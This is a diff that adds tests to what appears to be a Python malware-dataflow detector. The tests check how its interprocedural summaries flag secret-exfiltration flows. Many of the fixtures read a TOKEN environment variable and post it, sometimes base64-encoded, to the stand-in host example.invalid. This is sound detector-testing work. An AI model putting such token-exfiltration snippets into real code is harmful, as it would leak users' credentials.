@@ -1,6 +1,6 @@
 import malir.extractor as extractor_module
 from malir.detector import decide
-from malir.extractor import PythonExtractor
+from malir.extractor import ExtractorLimits, PythonExtractor
 
 
 def analyze(source: str):
@@ -394,3 +394,437 @@ def run(url, filename):
         if item.evidence_kind == "dataflow"
     ]
     assert len(exact) == 1
+
+
+def test_direct_local_parameter_to_sink_uses_bounded_summary():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+secret = os.getenv("TOKEN")
+transmit(secret)
+"""
+    )
+    flow = paths(result, "credential_or_file_exfil")
+    summary = [item for item in flow if item.evidence_kind == "summary"]
+    assert len(summary) == 1
+    assert summary[0].confidence == "medium"
+    assert event_operations(result, summary[0]) == [
+        "ENV_READ",
+        "NETWORK_SEND",
+    ]
+
+
+def test_direct_local_return_propagates_source_to_caller():
+    result = analyze(
+        """
+import os
+import requests
+
+def read_secret():
+    return os.getenv("TOKEN")
+
+requests.post("https://example.invalid", data=read_secret())
+"""
+    )
+    flow = paths(result, "credential_or_file_exfil")
+    summary = [item for item in flow if item.evidence_kind == "summary"]
+    assert len(summary) == 1
+    assert event_operations(result, summary[0]) == [
+        "ENV_READ",
+        "NETWORK_SEND",
+    ]
+
+
+def test_direct_local_transform_summary_keeps_transform_event():
+    result = analyze(
+        """
+import base64
+import os
+import requests
+
+def pack(value):
+    return base64.b64encode(value.encode())
+
+secret = os.getenv("TOKEN")
+requests.post("https://example.invalid", data=pack(secret))
+"""
+    )
+    summary = [
+        item
+        for item in paths(result, "credential_or_file_exfil")
+        if item.evidence_kind == "summary"
+    ]
+    assert len(summary) == 1
+    assert event_operations(result, summary[0]) == [
+        "ENV_READ",
+        "ENCODE",
+        "NETWORK_SEND",
+    ]
+
+
+def test_known_local_constant_return_kills_argument_provenance():
+    result = analyze(
+        """
+import os
+import requests
+
+def public_status(_secret):
+    return "healthy"
+
+secret = os.getenv("TOKEN")
+requests.post(
+    "https://example.invalid",
+    data=public_status(secret),
+)
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_direct_call_summary_binds_keyword_arguments():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(*, payload):
+    requests.post("https://example.invalid", json=payload)
+
+secret = os.getenv("TOKEN")
+transmit(payload=secret)
+"""
+    )
+    summary = [
+        item
+        for item in paths(result, "credential_or_file_exfil")
+        if item.evidence_kind == "summary"
+    ]
+    assert len(summary) == 1
+
+
+def test_function_parameter_does_not_resolve_to_shadowed_module_helper():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+def wrapper(transmit, value):
+    transmit(value)
+    return "healthy"
+
+secret = os.getenv("TOKEN")
+requests.post(
+    "https://example.invalid",
+    data=wrapper(lambda _value: "healthy", secret),
+)
+"""
+    )
+    assert not any(
+        item.evidence_kind == "summary"
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_recursive_direct_call_is_bounded_and_conservative():
+    result = analyze(
+        """
+import os
+import requests
+
+def first(value):
+    return second(value)
+
+def second(value):
+    return first(value)
+
+secret = os.getenv("TOKEN")
+requests.post("https://example.invalid", data=first(secret))
+"""
+    )
+    summary = [
+        item
+        for item in paths(result, "credential_or_file_exfil")
+        if item.evidence_kind == "summary"
+    ]
+    assert len(summary) == 1
+
+
+def test_direct_call_expansion_can_be_disabled_with_zero_depth():
+    result = PythonExtractor(
+        limits=ExtractorLimits(max_call_depth=0),
+    ).analyze_source(
+        """
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+secret = os.getenv("TOKEN")
+transmit(secret)
+""",
+        "sample.py",
+    )
+    assert not any(
+        item.evidence_kind == "summary"
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_zero_depth_does_not_label_unknown_return_passthrough_as_summary():
+    result = PythonExtractor(
+        limits=ExtractorLimits(max_call_depth=0),
+    ).analyze_source(
+        """
+import os
+import requests
+
+def identity(value):
+    return value
+
+secret = os.getenv("TOKEN")
+requests.post("https://example.invalid", data=identity(secret))
+""",
+        "sample.py",
+    )
+    flow = paths(result, "credential_or_file_exfil")
+    assert any(item.evidence_kind == "dataflow" for item in flow)
+    assert not any(item.evidence_kind == "summary" for item in flow)
+
+
+def test_lexical_local_binding_does_not_resolve_to_module_helper():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+def wrapper(value):
+    transmit(value)
+    transmit = lambda _value: "healthy"
+
+wrapper(os.getenv("TOKEN"))
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_awaited_async_direct_call_uses_summary():
+    result = analyze(
+        """
+import os
+import requests
+
+async def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+async def main():
+    secret = os.getenv("TOKEN")
+    await transmit(secret)
+"""
+    )
+    summary = [
+        item
+        for item in paths(result, "credential_or_file_exfil")
+        if item.evidence_kind == "summary"
+    ]
+    assert len(summary) == 1
+
+
+def test_unawaited_async_call_does_not_execute_callee_body():
+    result = analyze(
+        """
+import os
+import requests
+
+async def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+def main():
+    secret = os.getenv("TOKEN")
+    transmit(secret)
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_generator_call_does_not_execute_callee_body():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload):
+    yield requests.post("https://example.invalid", data=payload)
+
+transmit(os.getenv("TOKEN"))
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_rebound_module_function_is_not_expanded():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+transmit = lambda _value: "healthy"
+
+def wrapper(value):
+    transmit(value)
+
+wrapper(os.getenv("TOKEN"))
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_duplicate_module_definitions_are_not_guessed():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(_payload):
+    return "healthy"
+
+def wrapper(value):
+    transmit(value)
+
+wrapper(os.getenv("TOKEN"))
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_direct_call_summary_binds_positional_only_argument():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload, /):
+    requests.post("https://example.invalid", data=payload)
+
+transmit(os.getenv("TOKEN"))
+"""
+    )
+    assert any(
+        item.evidence_kind == "summary"
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_positional_only_parameter_is_not_bound_from_keyword():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload, /):
+    requests.post("https://example.invalid", data=payload)
+
+transmit(payload=os.getenv("TOKEN"))
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
+
+
+def test_direct_call_summary_uses_positional_default_provenance():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload=os.getenv("TOKEN")):
+    requests.post("https://example.invalid", data=payload)
+
+transmit()
+"""
+    )
+    summary = [
+        item
+        for item in paths(result, "credential_or_file_exfil")
+        if item.evidence_kind == "summary"
+    ]
+    assert len(summary) == 1
+    assert event_operations(result, summary[0]) == [
+        "ENV_READ",
+        "NETWORK_SEND",
+    ]
+
+
+def test_direct_call_summary_uses_keyword_only_default_provenance():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(*, payload=os.getenv("TOKEN")):
+    requests.post("https://example.invalid", json=payload)
+
+transmit()
+"""
+    )
+    summary = [
+        item
+        for item in paths(result, "credential_or_file_exfil")
+        if item.evidence_kind == "summary"
+    ]
+    assert len(summary) == 1
+
+
+def test_explicit_constant_argument_overrides_source_default():
+    result = analyze(
+        """
+import os
+import requests
+
+def transmit(payload=os.getenv("TOKEN")):
+    requests.post("https://example.invalid", data=payload)
+
+transmit("public status")
+"""
+    )
+    assert not any(
+        item.evidence_kind in {"dataflow", "summary"}
+        for item in paths(result, "credential_or_file_exfil")
+    )
